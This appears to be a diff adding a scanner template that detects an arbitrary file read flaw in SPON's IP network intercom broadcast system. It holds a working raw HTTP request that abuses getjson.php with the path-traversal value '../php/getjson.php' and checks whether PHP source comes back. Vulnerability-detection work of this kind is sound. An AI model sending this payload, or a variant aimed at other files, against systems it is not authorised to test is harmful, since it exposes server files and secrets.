@@ -1,0 +1,28 @@
+id: poc-yaml-spon-php-getjson-fileread
+info:
+  name: \u4E16\u90A6\u901A\u4FE1SPON IP\u7F51\u7EDC\u5BF9\u8BB2\u5E7F\u64AD\u7CFB\u7EDF getjson.php \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  metadata:
+    finger: IP\u7F51\u7EDC\u5BF9\u8BB2\u5E7F\u64AD\u7CFB\u7EDF
+http:
+  - raw:
+      - |
+        POST /php/getjson.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        jsondata[filename]=../php/getjson.php
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<?php"
+          - "$_POST"
+          - "\"data\""
+          - "file_get_contents($fullpath)"
